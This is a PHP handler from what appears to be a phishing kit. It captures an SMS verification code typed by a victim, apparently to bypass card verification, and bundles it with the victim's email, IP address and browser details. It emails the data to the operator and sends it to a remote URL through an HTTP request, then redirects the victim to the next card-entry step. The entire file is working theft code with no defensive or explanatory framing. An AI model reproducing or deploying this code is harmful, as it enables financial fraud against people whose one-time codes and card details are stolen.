<?php
	error_reporting(0);
	ob_start();
	session_start();
include '../../antibots.php';
include '../../config.php';
$message = "
_______________________________
SMS  :  ".$_POST['inc']."
_______________________________
IP: " . $_SERVER['REMOTE_ADDR'] . "
User Agent: ".$_SERVER['HTTP_USER_AGENT']."
";

$subject = "\xf0\x9f\x83\x8f Bypass Inc - ".$_SESSION['email']." \xf0\x9f\x83\x8f | "._ip();
$headers="From: \xf0\x9f\x95\xb7 ISK 17 \xf0\x9f\x95\xb7  <vbv@Ayz.com>";
mail($my_mail,$subject,$message,$headers);
file_get_contents($urls . urlencode($message));
$_SESSION['step_four']  = true;
header('location: ../card.php?enc=' . md5(time()) . '&p=2&dispatch=' . sha1(time()));
?>

